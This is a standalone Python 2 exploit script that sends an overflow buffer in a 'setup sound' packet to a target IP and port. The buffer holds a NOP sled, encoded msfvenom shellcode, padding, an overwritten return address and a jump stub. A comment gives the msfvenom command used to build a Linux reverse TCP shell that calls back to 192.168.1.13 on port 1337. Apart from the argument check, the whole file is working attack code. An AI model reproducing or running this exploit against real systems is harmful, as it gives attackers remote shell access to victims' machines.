#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.13 LPORT=1337 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20" -v shellcode
shellcode =  b""
shellcode += b"\xd9\xea\xbd\x42\x9f\x96\x3d\xd9\x74\x24\xf4"
shellcode += b"\x5a\x33\xc9\xb1\x12\x83\xc2\x04\x31\x6a\x13"
shellcode += b"\x03\x28\x8c\x74\xc8\x9d\x69\x8f\xd0\x8e\xce"
shellcode += b"\x23\x7d\x32\x58\x22\x31\x54\x97\x25\xa1\xc1"
shellcode += b"\x97\x19\x0b\x71\x9e\x1c\x6a\x19\xe1\x77\x8d"
shellcode += b"\xd4\x89\x85\x8e\xe3\x70\x03\x6f\x5b\xe4\x43"
shellcode += b"\x21\xc8\x5a\x60\x48\x0f\x51\xe7\x18\xa7\x04"
shellcode += b"\xc7\xef\x5f\xb1\x38\x3f\xfd\x28\xce\xdc\x53"
shellcode += b"\xf8\x59\xc3\xe3\xf5\x94\x84"        #size = 95
buff = '\x90' * 20 + shellcode + 'A' * 4253 + '\x96\x45\x13\x08' + '\x83\xC0\x0C\xFF\xE0\x90\x90'
print "Sending Buffer...\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send("\x11(setup sound " + buff + "\x90\x00#")
s.close()
